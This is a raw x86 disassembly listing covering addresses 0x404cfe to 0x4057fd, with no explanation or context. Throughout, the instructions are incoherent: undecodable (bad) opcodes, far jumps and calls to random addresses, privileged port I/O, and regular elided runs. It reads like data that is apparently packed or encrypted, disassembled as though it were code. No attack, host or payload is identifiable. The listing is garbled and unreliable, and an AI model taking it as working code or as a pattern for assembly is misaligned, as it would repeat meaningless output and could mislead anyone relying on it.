  404cfe:	jg     0x404d5b
  404d00:	rol    DWORD PTR ds:0xec695b3e,1
  404d06:	push   ds
  404d07:	js     0x404cf2
  404d09:	add    esi,DWORD PTR ds:0x57ede9b
  404d0f:	pop    esp
  404d10:	jmp    0x1618ce18
  404d15:	jmp    0x429cbab
  404d1a:	ds pop ebx
  404d1c:	es jg  0x404ca5
  404d1f:	outs   dx,BYTE PTR ds:[esi]
  404d20:	push   es
  404d21:	fld    DWORD PTR [eax]
	...
  404d4b:	add    BYTE PTR [ecx+0x4e],bh
  404d4e:	jmp    0x839b3156
  404d53:	add    edx,esp
  404d55:	pop    edx
  404d56:	add    DWORD PTR [ebx],0xffffffb3
  404d59:	fsub   st,st(1)
  404d5b:	call   0x8779cbb9
  404d60:	mov    ebx,0x49d8c67f
  404d65:	sub    ecx,esi
  404d67:	mov    cs,WORD PTR [edx+0x6e]
  404d6a:	(bad)  
  404d6b:	fdivr  DWORD PTR [ecx]
  404d6d:	or     BYTE PTR [ebp-0x1687a715],bh
  404d73:	add    esi,DWORD PTR ds:0x4d7ede9b
  404d79:	pop    esp
  404d7a:	jmp    0x3215f382
  404d7f:	inc    ebx
  404d80:	repz fimul WORD PTR ds:[ebx+0x7f]
  404d85:	pop    ebx
  404d86:	adc    DWORD PTR [ecx+0x2],0xfe0c867e
  404d8d:	dec    ebp
  404d8e:	sar    BYTE PTR gs:[esi],cl
  404d91:	pop    ebx
  404d92:	add    cl,ch
  404d94:	mov    edx,0x9648daa
  404d99:	outs   dx,BYTE PTR ds:[esi]
  404d9a:	jmp    DWORD PTR [esi+0xd]
  404d9d:	sub    eax,ebp
  404d9f:	call   0x4dfd:0xe2ff7de9
  404da6:	test   BYTE PTR [ebx],dh
  404da8:	cmp    eax,0x3870005b
  404dad:	jnp    0x404d9e
  404daf:	add    BYTE PTR ds:[eax],al
	...
  404dda:	xchg   esi,eax
  404ddb:	iret   
  404ddc:	test   DWORD PTR [ecx-0x6a],eax
  404ddf:	jge    0x404de0
  404de1:	cdq    
  404de2:	adc    eax,0x3da847f1
  404de7:	jle    0x404d9e
  404de9:	or     DWORD PTR [esi+0x4381ff7d],esp
  404def:	pop    ebx
  404df0:	add    BYTE PTR [ecx-0x6b],ch
  404df3:	lods   al,BYTE PTR ds:[esi]
  404df4:	sti    
  404df5:	push   es
  404df6:	xchg   esi,eax
  404df7:	push   ecx
  404df8:	shr    dh,0xf1
  404dfb:	mov    bh,0x0
  404dfd:	jmp    0xe939283f
  404e02:	ss aad 0x9c
  404e05:	jmp    0xde90a947
  404e0a:	scas   eax,DWORD PTR es:[edi]
  404e0b:	jb     0x404dfc
  404e0d:	(bad)  
  404e0e:	jno    0x404e3a
  404e10:	call   DWORD PTR [edx+ebp*2+0x2ac6ff6d]
  404e17:	inc    esp
  404e18:	cmc    
  404e19:	mov    esi,0xc185cf09
  404e1e:	and    DWORD PTR [ebp-0x1],edi
  404e21:	sbb    DWORD PTR [edx+0x42284801],edx
  404e27:	jl     0x404dde
  404e29:	mov    DWORD PTR [ecx],ebx
  404e2b:	jge    0x404e2c
  404e2d:	add    DWORD PTR [ebx+ebx*2],edi
  404e30:	add    BYTE PTR [ecx+0x12],ch
  404e33:	out    dx,al
  404e34:	cli    
  404e35:	add    al,al
  404e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e38:	or     eax,eax
  404e3a:	jmp    0x404e78
  404e3c:	cmp    DWORD PTR [ebp+0x0],0x0
	...
  404e67:	add    BYTE PTR [edi-0x2900008c],bh
  404e6d:	push   cs
  404e6e:	cmp    edx,DWORD PTR [eax-0x69]
  404e71:	rol    DWORD PTR [ebp-0x5b7f04],cl
  404e77:	push   eax
  404e78:	jg     0x404e00
  404e7a:	loop   0x404e7c
  404e7c:	xlat   BYTE PTR ds:[ebx]
  404e7d:	dec    eax
  404e7e:	lea    eax,[ebp-0x8bfd]
  404e84:	xlat   BYTE PTR ds:[ebx]
  404e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e86:	mov    ch,0xec
  404e88:	add    BYTE PTR [edi+edi*8-0x549e18],ah
  404e8f:	(bad)  
  404e90:	jg     0x404e37
  404e92:	mov    ch,0xe8
  404e94:	inc    eax
  404e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e96:	call   DWORD PTR [eax+0x30]
  404e99:	jmp    0xdbe8:0xa430efec
  404ea0:	jnp    0x404e47
  404ea2:	(bad)  
  404ea3:	call   0x3fef3f
  404ea8:	cmp    al,0x37
  404eaa:	lea    eax,[ebp-0x8aad]
  404eb0:	pop    ss
  404eb1:	outs   dx,DWORD PTR ds:[esi]
  404eb2:	fsub   st,st(2)
  404eb4:	addr16 pop eax
  404eb6:	inc    eax
  404eb7:	push   eax
  404eb8:	loop   0x404e94
  404eba:	cld    
  404ebb:	out    dx,eax
  404ebc:	jo     0x404e63
  404ebe:	push   eax
  404ebf:	(bad)  
  404ec0:	mov    edx,0xf0ffef74
  404ec5:	outs   dx,DWORD PTR ds:[esi]
  404ec6:	mov    ah,0xf4
  404ec8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eca:	call   0x404fb8
	...
  404ef3:	add    BYTE PTR [eax],al
  404ef5:	add    al,ch
  404ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ef8:	(bad)  
  404ef9:	(bad)  
  404efa:	jp     0x404f74
  404efc:	out    dx,eax
  404efd:	push   DWORD PTR [eax+0x3ef7de6f]
  404f03:	in     eax,0xd6
  404f05:	(bad)  
  404f06:	mov    ebx,0xf9ffe6e5
  404f0b:	jmp    0x75d5:0xfcf1fe8e
  404f12:	jmp    0x6972:0x3ee3ced9
  404f19:	add    cl,bl
  404f1b:	(bad)  
  404f1d:	out    dx,eax
  404f1e:	rcr    DWORD PTR [ebx+ebp*8],1
  404f21:	outs   dx,DWORD PTR ds:[esi]
  404f22:	shl    BYTE PTR [esi+edx*8],cl
  404f25:	push   0x3e
  404f27:	or     eax,0x14a9ec90
  404f2c:	(bad)  
  404f2d:	call   0x16954e
  404f32:	mov    ebx,0xa1efdeee
  404f37:	sub    al,0x33
  404f39:	call   ebx
  404f3b:	popa   
  404f3c:	out    0xff,al
  404f3e:	xchg   ecx,eax
  404f3f:	imul   edi,DWORD PTR [edx-0x1d],0xc080723e
  404f46:	push   es
  404f47:	mov    ecx,0x646eb5d6
  404f4c:	(bad)  
  404f4d:	jmp    DWORD PTR [esi-0x33]
  404f50:	out    0xff,al
  404f52:	imul   edi,edx,0x6c51e87f
  404f58:	aad    0xff
	...
  404f82:	add    BYTE PTR [eax],al
  404f84:	xchg   ebx,eax
  404f85:	test   eax,0xa951ffe5
  404f8a:	outs   dx,BYTE PTR ds:[esi]
  404f8b:	test   DWORD PTR [ecx-0x5c],0x32f62ea1
  404f92:	add    al,0xff
  404f94:	repz test al,0xe5
  404f97:	push   DWORD PTR [ecx]
  404f99:	lea    ecx,[ecx-0x1e]
  404f9c:	test   BYTE PTR ds:[eax],cl
  404f9f:	shr    BYTE PTR [edx+0x268d888d],0x5c
  404fa6:	xchg   esi,eax
  404fa7:	aad    0x11
  404fa9:	out    0x99,eax
  404fab:	mov    DWORD PTR [ebx+0x49],ecx
  404fae:	and    DWORD PTR [ebx+0x3e],eax
  404fb1:	outs   dx,BYTE PTR ds:[esi]
  404fb2:	inc    ebp
  404fb3:	aad    0xb3
  404fb5:	jg     0x404f4d
  404fb7:	aad    0xf1
  404fb9:	cmp    DWORD PTR [ebx+0x645b3ee1],0x7f
  404fc0:	fimul  DWORD PTR [edx+0x7a6ed56e]
  404fc6:	pushf  
  404fc7:	call   0xec9ecaad
  404fcc:	add    al,0x7e
  404fce:	jmp    0xd1dc0ad6
  404fd3:	dec    eax
  404fd4:	mov    ecx,0xb1e555b0
  404fd9:	jp     0x40502c
  404fdb:	or     DWORD PTR [ecx-0x4474c986],ebx
  404fe1:	cmp    DWORD PTR [esi],0xffffffd5
  404fe4:	cdq    
  404fe5:	jp     0x405043
  404fe7:	in     al,dx
	...
  405010:	add    BYTE PTR [eax],al
  405012:	mov    eax,ds:0x53ec1e7a
  405017:	jb     0x40502f
  405019:	aad    0xdd
  40501b:	sub    eax,0x7a3e42a1
  405020:	cmp    al,0xe0
  405022:	popa   
  405023:	jp     0x405023
  405025:	jmp    0x40507b
  405027:	jl     0x405012
  405029:	add    esi,DWORD PTR ds:0xc4f8759b
  40502f:	call   0x7a923505
  405034:	jb     0x405009
  405036:	mov    ch,0x38
  405038:	sbb    ecx,DWORD PTR [edi+edi*8+0x5a]
  40503c:	ficomp DWORD PTR [edi-0x1b324fc7]
  405042:	xor    DWORD PTR [edx-0x2f],edi
  405045:	mov    dl,0x1f
  405047:	pop    ebx
  405048:	add    cl,ch
  40504a:	or     dh,BYTE PTR [eax+0x79f2bef0]
  405050:	call   0xffba685f
  405055:	sahf   
  405056:	mov    eax,0xea96ef86
  40505b:	sbb    BYTE PTR [eax+0x7f],0x12
  40505f:	jp     0x4050c0
  405061:	daa    
  405062:	add    eax,0xe172559e
  405067:	add    al,0x8
  405069:	sbb    edi,0xc66eff70
  40506f:	mov    bh,bh
  405071:	sbb    al,0xc6
  405073:	and    al,BYTE PTR [ecx-0x17]
	...
  40509e:	add    BYTE PTR [eax],al
  4050a0:	ret    0xff5c
  4050a3:	fdiv   QWORD PTR ds:0xc4e542ea
  4050a9:	dec    edi
  4050aa:	mov    WORD PTR [ecx+0x2bc95afc],?
  4050b0:	test   eax,0x99625479
  4050b5:	ffree  st(4)
  4050b7:	xor    DWORD PTR [edx-0x5e],ebp
  4050ba:	inc    ebp
  4050bb:	and    DWORD PTR ds:0xbee9005b,edi
  4050c1:	test   DWORD PTR [edi],0xff4cf1e9
  4050c7:	xchg   esp,eax
  4050c8:	inc    ecx
  4050c9:	jp     0x405140
  4050cb:	icebp  
  4050cc:	out    0x5a,eax
  4050ce:	call   0xffb9d8cf
  4050d3:	pusha  
  4050d4:	and    BYTE PTR [edi-0x15],dh
  4050d7:	out    0x9a,al
  4050d9:	pop    ds
  4050da:	cld    
  4050db:	jmp    0x7240ac1d
  4050e0:	das    
  4050e1:	out    0x48,eax
  4050e3:	sub    BYTE PTR [edx],bh
  4050e5:	xchg   BYTE PTR [ebx],dl
  4050e7:	bound  eax,QWORD PTR [edi+0x60003b77]
  4050ed:	arpl   WORD PTR [ebp+0x9],si
  4050f0:	loopne 0x405114
  4050f2:	clc    
  4050f3:	add    DWORD PTR [edi],edx
  4050f5:	pop    ebp
  4050f6:	add    bl,ch
  4050f8:	and    edx,edi
  4050fa:	ds or  ebx,eax
  4050fd:	adc    ch,cl
  4050ff:	sub    DWORD PTR [edx],0xffffffa7
  405102:	add    BYTE PTR [ebp+0x0],dh
	...
  40512d:	add    BYTE PTR [edi],bl
  40512f:	mov    ?,WORD PTR [ebp-0x4]
  405132:	mov    edi,0xb8ffffe1
  405137:	clc    
  405138:	inc    esp
  405139:	clc    
  40513a:	dec    eax
  40513b:	mov    dh,0xc2
  40513d:	or     bh,dl
  40513f:	xor    eax,0x377b3d8b
  405144:	inc    ecx
  405145:	add    BYTE PTR [edi+esi*2+0x56],ch
  405149:	mov    ebp,DWORD PTR [eax]
  40514b:	xchg   edi,eax
  40514c:	imul   BYTE PTR ds:[eax-0x74]
  405150:	or     edi,edi
  405152:	xchg   edx,eax
  405153:	nop
  405154:	mov    DWORD PTR ds:0x41372b,0x5c97
  40515e:	enter  0x55a1,0x8b
  405162:	pop    ebx
  405163:	xor    al,0x56
  405165:	push   0xffffffa7
  405167:	lea    esi,[ebp+0x8]
  40516a:	das    
  40516b:	int    0xf9
  40516d:	jmp    FWORD PTR [eax]
  40516f:	clc    
  405170:	idiv   edi
  405172:	shl    BYTE PTR [edi+eiz*8-0x15],cl
  405176:	inc    edi
  405177:	pop    edi
  405178:	add    BYTE PTR [ebx+0xf765e3f],al
  40517e:	rcr    ah,0x3f
  405181:	and    dl,dl
  405183:	jae    0x405180
  405185:	(bad)  
  405186:	lock pop ebp
  405188:	mov    ecx,eax
  40518a:	rcr    BYTE PTR fs:[edi+0x68],0x3e
  40518f:	repnz cmp al,BYTE PTR [ecx+0x0]
	...
  4051bb:	add    BYTE PTR [esi],bh
  4051bd:	xor    esp,ebx
  4051bf:	push   0x1c
  4051c1:	add    BYTE PTR [ebx],0xb
  4051c4:	(bad)  
  4051c5:	sub    eax,0x867ec608
  4051ca:	add    ebp,DWORD PTR [edx+0x7a]
  4051cd:	sbb    al,0x4
  4051cf:	push   edi
  4051d0:	es and dh,ah
  4051d3:	add    BYTE PTR [esi],bh
  4051d5:	ins    DWORD PTR es:[edi],dx
  4051d6:	ret    
  4051d7:	je     0x405214
  4051d9:	enter  0x3,0xe5
  4051dd:	test   cl,cl
  4051df:	pop    es
  4051e0:	ds pop ecx
  4051e2:	fsubr  QWORD PTR [eax-0x7cfc7e22]
  4051e8:	out    0x84,al
  4051ea:	pop    edx
  4051eb:	add    eax,DWORD PTR [eax]
  4051ed:	add    DWORD PTR [ebx],0x329ff98b
  4051f3:	leave  
  4051f4:	cld    
  4051f5:	jge    0x4051fa
  4051f7:	push   ebp
  4051f8:	mov    ch,0x1d
  4051fa:	xchg   ah,al
  4051fc:	mov    edx,0x3b0c47fc
  405201:	xor    bl,0xff
  405204:	test   eax,0xabc5dbd1
  405209:	xor    dl,dl
  40520b:	mov    DWORD PTR [ebx],eax
  40520d:	inc    esi
  40520e:	shl    BYTE PTR [ebp+0x42],cl
  405211:	inc    ecx
  405212:	pop    eax
  405213:	cld    
  405214:	mov    esi,ecx
  405216:	sti    
  405217:	out    0x95,eax
  405219:	push   esi
  40521a:	sar    bh,cl
  40521c:	jns    0x4051ec
  40521e:	repz inc BYTE PTR [eax]
	...
  405249:	add    bl,ch
  40524b:	ins    DWORD PTR es:[edi],dx
  40524c:	shl    BYTE PTR [ebp+0x6a],cl
  40524f:	dec    ecx
  405250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405251:	or     DWORD PTR [esi],edi
  405253:	adc    dl,0x75
  405256:	pop    edx
  405257:	pop    ecx
  405258:	mov    dh,ch
  40525a:	push   ecx
  40525b:	pop    edx
  40525c:	out    0xbb,al
  40525e:	jl     0x4052c6
  405260:	jmp    0x3fc7079b
  405265:	xor    eax,0xfc547691
  40526a:	sbb    ebp,edx
  40526c:	leave  
  40526d:	add    al,0x3e
  40526f:	retf   
  405270:	bnd ret 
  405272:	stos   DWORD PTR es:[edi],eax
  405273:	pop    esi
  405274:	push   ss
  405275:	sub    eax,0xfcaba478
  40527a:	adc    edx,esp
  40527c:	and    al,0xfc
  40527e:	mov    ecx,0xb574c1e2
  405283:	lock in al,0x1c
  405286:	(bad)  
  405287:	ja     0x4052d9
  405289:	shl    ecx,1
  40528b:	jbe    0x405213
  40528d:	je     0x40527b
  40528f:	lds    ebx,FWORD PTR [ecx-0x7c]
  405292:	and    DWORD PTR [ebx-0x3],ebx
  405295:	jmp    0x5bde:0x53810a70
  40529c:	jmp    0xe630dc9d
  4052a1:	xor    BYTE PTR [ebp+0x15],ah
  4052a4:	and    dh,al
  4052a6:	inc    esi
  4052a7:	pop    ebx
  4052a8:	pusha  
  4052a9:	or     bh,BYTE PTR [ebp+0xdced9d]
	...
  4052d7:	add    BYTE PTR [eax+0x3e03e8b3],dl
  4052dd:	pop    ebx
  4052de:	xchg   esi,eax
  4052df:	sub    al,0xf8
  4052e1:	mov    ds:0xfe91fc2b,eax
  4052e6:	in     al,0x3c
  4052e8:	call   FWORD PTR [edx-0x6f]
  4052eb:	jmp    0x76d1:0xdbe91bf6
  4052f2:	push   cs
  4052f3:	shl    esi,1
  4052f5:	fidiv  WORD PTR [edx-0x6cfcc1be]
  4052fb:	cmp    eax,0x1005aff
  405300:	fidiv  DWORD PTR [ebp-0x1]
  405303:	out    dx,al
  405304:	cmc    
  405305:	sbb    cl,BYTE PTR [ebx+0x28]
  405308:	inc    edx
  405309:	add    esi,DWORD PTR [ebx]
  40530b:	xor    ch,bh
  40530d:	pop    edx
  40530e:	call   0xffb66263
  405313:	inc    ecx
  405314:	int3   
  405315:	and    DWORD PTR [ecx-0x17],eax
  405318:	test   DWORD PTR [ebx-0x7cc5d7b5],edi
  40531e:	push   0xffffffb6
  405320:	out    dx,al
  405321:	jne    0x40538b
  405323:	cmc    
  405324:	push   edx
  405325:	sbb    al,0x0
  405327:	adc    DWORD PTR [ebx+eiz*1],ebx
  40532a:	inc    ecx
  40532b:	jmp    0x973f6515
  405330:	push   cs
  405331:	add    ebp,DWORD PTR [edx+eiz*1]
  405334:	jge    0x405391
  405336:	push   0x1c2557
  40533b:	xchg   ecx,eax
	...
  405364:	add    BYTE PTR [eax],al
  405366:	and    DWORD PTR [esi-0x1],esi
  405369:	jbe    0x4053e0
  40536b:	ror    DWORD PTR [ebx+0x28],cl
  40536e:	cmp    al,BYTE PTR [ebx]
  405370:	in     al,dx
  405371:	mov    bl,0x7c
  405373:	pop    ebx
  405374:	call   0xffb64295
  405379:	shr    DWORD PTR [ecx],0x22
  40537c:	inc    ecx
  40537d:	jmp    0xa88bb497
  405382:	cmp    eax,0x8e3e2e83
  405387:	jne    0x40534c
  405389:	pushf  
  40538a:	sbb    al,BYTE PTR [edi+0x6095a48b]
  405390:	rcr    BYTE PTR [ebp-0x16c724c0],0xe8
  405397:	arpl   WORD PTR [eax+0x5b3de9],di
  40539d:	and    BYTE PTR [ebx+0x5e],bh
  4053a0:	add    BYTE PTR [eax],al
  4053a2:	mov    WORD PTR [edi+0x61d717eb],gs
  4053a8:	pop    esp
  4053a9:	je     0x405415
  4053ab:	fnstcw WORD PTR [eax]
  4053ad:	das    
  4053ae:	retf   0xba62
  4053b1:	add    DWORD PTR [edi+0x59],edx
  4053b4:	add    bl,ch
  4053b6:	pop    edx
  4053b7:	jecxz  0x4053b9
  4053b9:	add    BYTE PTR [edi],ah
  4053bb:	pop    ecx
  4053bc:	inc    eax
  4053bd:	or     BYTE PTR [edi+0x5f],0x75
  4053c1:	in     al,0xac
  4053c3:	cdq    
  4053c4:	leave  
  4053c5:	ret    0x591b
  4053c8:	push   ebp
  4053c9:	mov    eax,DWORD PTR [eax]
	...
  4053f3:	add    BYTE PTR [ebx],al
  4053f5:	sub    eax,0x229c5356
  4053fa:	or     al,0x5
  4053fc:	pop    ss
  4053fd:	pop    ebp
  4053fe:	add    BYTE PTR [eax],al
  405400:	(bad)  
  405401:	jg     0x405453
  405403:	call   0x3fe75c
  405408:	pop    esp
  405409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40540a:	mov    ebx,eax
  40540c:	ins    BYTE PTR es:[edi],dx
  40540d:	adc    cl,BYTE PTR [eax]
  40540f:	mov    edx,DWORD PTR [edx]
  405411:	pop    ebx
  405412:	jmp    0x405416
  405414:	mov    esi,DWORD PTR [esi]
  405416:	or     ecx,ecx
  405418:	retf   
  405419:	arpl   WORD PTR [eax-0xaec32c2],ax
  40541f:	or     ecx,DWORD PTR [esi]
  405421:	adc    eax,DWORD PTR [edx]
  405423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405424:	ficom  WORD PTR [ecx-0x40]
  405427:	stos   BYTE PTR es:[edi],al
  405428:	sbb    dh,BYTE PTR [esi-0x67d3198b]
  40542e:	pop    ebx
  40542f:	pop    esi
  405430:	shl    BYTE PTR [edi+0x29a708c2],0x56
  405437:	mov    ecx,0x589b
  40543c:	pop    es
  40543d:	dec    eax
  40543e:	rcl    BYTE PTR [eax-0x536f3e9c],cl
  405444:	ds repnz (bad) 
  405447:	mov    ch,0x7e
  405449:	(bad)  
  40544c:	into   
  40544d:	test   DWORD PTR [eax+edx*4],0x900e40bd
  405454:	std    
  405455:	lods   eax,DWORD PTR ds:[esi]
  405456:	push   ds
  405457:	nop
	...
  405480:	add    BYTE PTR [eax],al
  405482:	retf   
  405483:	jnp    0x4054f8
  405485:	cmp    DWORD PTR [ebp+edi*1+0x74],0x43
  40548a:	add    dl,BYTE PTR [edx+0x74]
  40548d:	jl     0x4054d3
  40548f:	dec    esi
  405490:	or     eax,0x77fb190
  405495:	add    al,0x3d
  405497:	rol    BYTE PTR [edx+0x3c],cl
  40549a:	jg     0x4054ae
  40549c:	dec    edi
  40549d:	or     ebx,DWORD PTR [edx+0x48]
  4054a0:	je     0x405521
  4054a2:	cmp    BYTE PTR [esi+0x44],dh
  4054a5:	nop
  4054a6:	cmp    eax,0x9f3c42b2
  4054ab:	repnz dec esi
  4054ad:	or     bh,BYTE PTR [edx]
  4054af:	dec    eax
  4054b0:	je     0x405531
  4054b2:	cmp    esi,DWORD PTR [esi+0x410e0346]
  4054b8:	(bad)
  4054bb:	loopne 0x405451
  4054bd:	rol    DWORD PTR [esp+eax*4],0x7a
  4054c1:	ret    0xba41
  4054c4:	(bad)  
  4054c5:	call   0x8bb3fe00
  4054ca:	cmc    
  4054cb:	icebp  
  4054cc:	sub    al,0x5b
  4054ce:	jge    0x405486
  4054d0:	jp     0x4054be
  4054d2:	or     eax,0xb5fc35ad
  4054d7:	mov    dh,0xfb
  4054d9:	(bad)  
  4054da:	mov    ch,0xb6
  4054dc:	repz pop ebp
  4054df:	mov    esi,0x494d8fff
  4054e4:	loop   0x405508
	...
  40550e:	add    BYTE PTR [eax],al
  405510:	scas   al,BYTE PTR es:[edi]
  405511:	pop    edx
  405512:	mov    eax,0x1de89673
  405517:	into   
  405518:	jns    0x4054e4
  40551a:	ins    BYTE PTR es:[edi],dx
  40551b:	mov    esp,0xc44362f0
  405520:	push   esi
  405521:	bound  ebx,QWORD PTR [ecx+0x42]
  405524:	pop    esp
  405525:	jb     0x405580
  405527:	sub    al,0xae
  405529:	xlat   BYTE PTR ds:[ebx]
  40552a:	das    
  40552b:	pop    es
  40552c:	scas   al,BYTE PTR es:[edi]
  40552d:	xlat   BYTE PTR ds:[ebx]
  40552e:	add    BYTE PTR [edi],al
  405530:	scas   al,BYTE PTR es:[edi]
  405531:	repz (bad) 
  405533:	je     0x4054ea
  405535:	xchg   edi,eax
  405536:	jns    0x405566
  405538:	cdq    
  405539:	push   ss
  40553a:	mov    al,ds:0x345b42c2
  40553f:	jns    0x40555b
  405541:	(bad)  [ebp-0x418cdf20]
  405547:	xor    DWORD PTR [ebp-0x6a],esp
  40554a:	fs inc edi
  40554c:	adc    cl,BYTE PTR [ecx+eax*2]
  40554f:	ja     0x4055c7
  405551:	sbb    al,0xe9
  405553:	int3   
  405554:	dec    ebx
  405555:	lds    esi,FWORD PTR [ecx]
  405557:	inc    ebx
  405558:	xor    DWORD PTR ds:[ebx-0x53],0x3e
  40555d:	pop    ebx
  40555e:	loop   0x405523
  405560:	jae    0x40559f
  405562:	xchg   BYTE PTR [edi+0x4e],dl
  405565:	jb     0x40555b
  405567:	jmp    DWORD PTR [edi+0x5e]
  40556a:	add    eax,DWORD PTR [ecx+edx*8]
  40556d:	call   0x6f942252
  405572:	push   ecx
  405573:	test   DWORD PTR [eax],eax
	...
  40559d:	add    cl,ah
  40559f:	pop    ebx
  4055a0:	jmp    0xe8294f9d
  4055a5:	inc    eax
  4055a6:	mov    cl,0xe8
  4055a8:	dec    esp
  4055a9:	fcomp  QWORD PTR [edx+edx*4]
  4055ac:	jmp    0xeed68ab4
  4055b1:	xchg   BYTE PTR [ebx+0x3de9005b],al
  4055b7:	loopne 0x40553e
  4055b9:	cmp    bh,BYTE PTR [eax+0x72]
  4055bc:	(bad)  
  4055bd:	mov    ecx,0xe90156e5
  4055c2:	cmp    eax,0x3a374d83
  4055c7:	pop    ebx
  4055c8:	or     ebp,DWORD PTR [ecx]
  4055ca:	imul   ebx,esi,0xffffffac
  4055cd:	jmp    0xe57db10f
  4055d2:	cmp    al,0x5b
  4055d4:	add    dh,ah
  4055d6:	mov    edx,0x3de900bc
  4055db:	add    eax,0x6eb87400
  4055e0:	(bad)  
  4055e1:	fimul  WORD PTR [edx]
  4055e3:	or     ebp,eax
  4055e5:	sbb    esp,eax
  4055e7:	pop    edx
  4055e8:	add    BYTE PTR [eax+eax*8+0x6d],bl
  4055ec:	inc    dh
  4055ee:	repnz or ch,al
  4055f1:	sub    DWORD PTR [eax],ecx
  4055f3:	jb     0x4055f4
  4055f5:	loop   0x4055f4
  4055f7:	out    0x1b,eax
  4055f9:	inc    ecx
  4055fa:	shl    BYTE PTR [edx],0x41
  4055fd:	jmp    0xa0342e82
	...
  40562a:	add    BYTE PTR [eax],al
  40562c:	or     dh,BYTE PTR [edx+0x50]
  40562f:	add    DWORD PTR [edi-0x5710097],0x21907e7
  405639:	cwde   
  40563a:	idiv   BYTE PTR [esi+0xa]
  40563d:	xchg   BYTE PTR [edi],cl
  40563f:	jbe    0x4056a9
  405641:	arpl   WORD PTR [ebp-0x8f119c],cx
  405647:	or     ax,0x6083
  40564b:	push   edi
  40564c:	mov    dh,BYTE PTR [ecx-0x77]
  40564f:	ins    BYTE PTR es:[edi],dx
  405650:	xchg   ecx,eax
  405651:	jo     0x405652
  405653:	dec    esi
  405654:	pop    es
  405655:	pop    ebx
  405656:	push   0x0
  405658:	xchg   edi,eax
  405659:	adc    eax,DWORD PTR [edx]
  40565b:	push   0xffffffa7
  40565d:	adc    eax,DWORD PTR [ebx]
  40565f:	push   0xc0005da7
  405664:	pop    eax
  405665:	leave  
  405666:	in     al,dx
  405667:	(bad)  
  405668:	pop    eax
  405669:	lahf   
  40566a:	call   0x9e90ce
  40566f:	mov    DWORD PTR [edx+0x6f7440a5],esp
  405675:	sahf   
  405676:	jne    0x405688
  405678:	cmp    BYTE PTR [ecx],cl
  40567a:	or     al,0xff
  40567c:	shl    BYTE PTR [ebp-0x60c50818],cl
  405682:	dec    DWORD PTR [ebx-0x78a60d1]
  405688:	outs   dx,DWORD PTR ds:[esi]
  405689:	xor    ebx,ebp
  40568b:	add    BYTE PTR [edi],ah
  40568d:	jb     0x405669
  40568f:	jne    0x405691
	...
  4056b9:	add    BYTE PTR [esi+eiz*4],bl
  4056bc:	mov    ch,0xec
  4056be:	stc    
  4056bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056c0:	(bad)  
  4056c1:	call   0x41196d
  4056c6:	fmul   st,st(2)
  4056c8:	in     al,dx
  4056c9:	dec    al
  4056cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056cc:	call   0xffe51c3a
  4056d1:	mov    edx,esp
  4056d3:	inc    eax
  4056d4:	leave  
  4056d5:	ret    0x5ceb
  4056d8:	push   ebp
  4056d9:	mov    edi,DWORD PTR [ebx-0x46133b2a]
  4056df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056e0:	call   DWORD PTR [ebx-0x48]
  4056e3:	or     cl,BYTE PTR [edi+edi*8]
  4056e6:	shl    BYTE PTR [edi+eiz*2-0x6b],cl
  4056ea:	pop    ds
  4056eb:	push   ss
  4056ec:	add    bh,bh
  4056ee:	xchg   edx,eax
  4056ef:	into   
  4056f0:	dec    eax
  4056f1:	inc    ecx
  4056f2:	xlat   BYTE PTR ds:[ebx]
  4056f3:	xchg   esp,eax
  4056f4:	pop    edx
  4056f5:	cmc    
  4056f6:	sbb    BYTE PTR [ebx+ecx*1-0x7f86c140],ah
  4056fd:	fidivr DWORD PTR [esi]
  4056ff:	add    BYTE PTR [ebx],0x2b
  405702:	test   edi,esp
  405704:	sub    bh,0x98
  405707:	xor    ebx,ecx
  405709:	push   eax
  40570a:	es jle 0x405711
  40570d:	add    BYTE PTR [esi],bh
  40570f:	sbb    dh,BYTE PTR [ebx]
  405711:	fnstsw WORD PTR [esi]
  405713:	cmp    dh,0xbf
  405716:	dec    ecx
  405717:	test   BYTE PTR [eax+0x8823e00],0x4
	...
  405746:	add    BYTE PTR [eax],al
  405748:	aas    
  405749:	add    BYTE PTR [ebx],0xf
  40574c:	mov    ecx,0x3e000434
  405751:	inc    DWORD PTR [eax-0x4]
  405754:	out    dx,al
  405755:	pop    ecx
  405756:	pop    edi
  405757:	jmp    0x85b8d8a5
  40575c:	push   ecx
  40575d:	js     0x405729
  40575f:	dec    DWORD PTR [esi+0x31fd3a8a]
  405765:	mov    esi,edi
  405767:	mov    edi,0x865b7eb3
  40576c:	jbe    0x4057b1
  40576e:	add    al,0x8d
  405770:	ret    
  405771:	mov    al,ds:0x5211ffc9
  405776:	fmul   QWORD PTR [ecx-0x353eed]
  40577c:	mov    ebp,DWORD PTR [edx+0x33]
  40577f:	call   0xb1e96
  405784:	in     eax,0x78
  405786:	retf   0x3675
  405789:	jo     0xcb19387e
  40578f:	push   eax
  405790:	out    0x60,al
  405792:	sar    edi,1
  405794:	rcl    DWORD PTR [ecx-0x35],1
  405797:	jne    0x405763
  405799:	push   ecx
  40579a:	fsub   QWORD PTR ds:0xca665ad5
  4057a0:	inc    ebp
  4057a1:	fwait
  4057a2:	aad    0x36
  4057a4:	mov    cl,0xe5
  4057a6:	push   esp
  4057a7:	fcmovnbe st,st(0)
  4057a9:	or     DWORD PTR [esi-0x36],0x0
	...
  4057d4:	add    BYTE PTR [eax],al
  4057d6:	mov    bh,0x15
  4057d8:	inc    ecx
  4057d9:	xchg   BYTE PTR [ebx],bl
  4057db:	jae    0x4057c6
  4057dd:	dec    edi
  4057de:	cld    
  4057df:	(bad)  [edi+ecx*8-0x384b9012]
  4057e6:	xchg   esi,eax
  4057e7:	mov    ecx,0xd63e0344
  4057ec:	sub    DWORD PTR [ebx+0x2c],ecx
  4057ef:	jo     0x40578d
  4057f1:	iret   
  4057f2:	push   esi
  4057f3:	in     eax,0x2c
  4057f5:	add    edi,DWORD PTR [esi]
  4057f7:	sub    DWORD PTR fs:[edi+0x20],ecx
  4057fb:	or     edi,esi
  4057fd:	dec    edi
